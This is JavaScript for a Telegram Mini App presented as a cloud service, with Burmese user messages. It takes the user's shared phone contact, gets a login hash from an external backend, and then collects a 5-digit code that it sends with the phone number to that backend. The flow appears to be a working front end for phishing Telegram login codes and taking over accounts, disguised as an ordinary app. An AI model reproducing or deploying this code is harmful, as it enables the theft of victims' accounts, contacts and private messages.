const tg = window.Telegram.WebApp;
tg.expand();

// 🔴 သင့် Render URL ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://telegramcloudbackend.onrender.com"; 


let phoneHash = "", userPhone = "", pollingInterval;
let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function requestContact() {
    tg.requestContact(function(shared) {
        if (shared) {
            switchStep("step-loading");
            let userId = tg.initDataUnsafe?.user?.id;
            
            if (!userId) {
                alert("Error: Telegram User ID ဖတ်မရပါ။");
                switchStep("step-phone");
                return;
            }
            
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    alert("Timeout: ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။");
                    switchStep("step-phone");
                }
            }, 15000);
        }
    });
}

async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, {
            method: "POST", 
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ user_id: userId })
        });
        
        let result = await res.json();
        
        if (result.success) {
            clearInterval(pollingInterval); 
            pollingInterval = null;
            userPhone = result.phone;
            phoneHash = result.hash;
            switchStep("step-otp"); 
            tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval);
            pollingInterval = null;
            alert("Error: " + result.message);
            switchStep("step-phone");
        }
    } catch(e) {
        console.log("Waiting for backend...");
    }
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName })
        });
        
        let result = await res.json();
        if(result.success) {
            switchStep("step-success");
            tg.HapticFeedback.notificationOccurred("success"); 
        } else {
            alert("Error: " + result.message);
            switchStep("step-otp");
        }
    } catch(e) {
        alert("Verification Failed.");
        switchStep("step-otp");
    }
}
